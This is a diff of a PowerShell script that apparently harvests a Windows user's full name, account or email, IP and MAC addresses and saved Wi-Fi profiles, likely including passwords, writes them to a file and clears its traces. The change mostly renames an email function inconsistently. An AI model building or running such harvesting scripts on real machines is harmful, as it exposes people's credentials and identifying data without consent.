@@ -18,31 +18,31 @@ $fullName = Get-fullName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Get-email {
+function pcname {
     try {
         # Attempt to retrieve email from the user's environment variables (if available)
-        $email = $env:EMAILADDRESS
+        $PCName = $env:EMAILADDRESS
 
         # If the email is not set in the environment, use an alternative method
-        if (-not $email) {
-            $email = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).Caption
+        if (-not $PCName) {
+            $PCName = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).Caption
         }
 
         # If no email is detected, return a fallback message
-        if (-not $email) {
-            $email = "No Email Detected"
+        if (-not $PCName) {
+            $PCName = "No name Detected"
         }
 
-        return $email
+        return $PCName
     }
     catch {
-        Write-Error "An email was not found" 
-        return "No Email Detected"
+        Write-Error "An name was not found"
+        return "No name Detected"
         -ErrorAction SilentlyContinue
-    }        
+    }
 }
 
-$email = Get-email
+$PCName = pcname
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -55,7 +55,7 @@ catch {
 
 $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
 
-$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -85,7 +85,7 @@ $wifiProfiles = $profileNames | ForEach-Object {
 $output = @"
 Full Name: $fullName
 
-Email: $email
+Email: $PCName
 
 ------------------------------------------------------------------------------------------------------------------------------
 Public IP: 
@@ -111,7 +111,7 @@ Write-Output "File saved to: $FileName"
 #------------------------------------------------------------------------------------------------------------------------------------
 
 # Clean up any variables or intermediate data
-Remove-Variable -Name 'fullName', 'email', 'computerPubIP', 'localIP', 'MAC', 'profiles', 'profileNames', 'profileDetails', 'passMatch', 'wifiProfiles' -ErrorAction SilentlyContinue
+Remove-Variable -Name 'fullName', 'PCName', 'computerPubIP', 'localIP', 'MAC', 'profiles', 'profileNames', 'profileDetails', 'passMatch', 'wifiProfiles' -ErrorAction SilentlyContinue
 
 # Optionally, you can also clear the content of variables used for storing intermediate data
 $profiles = $null
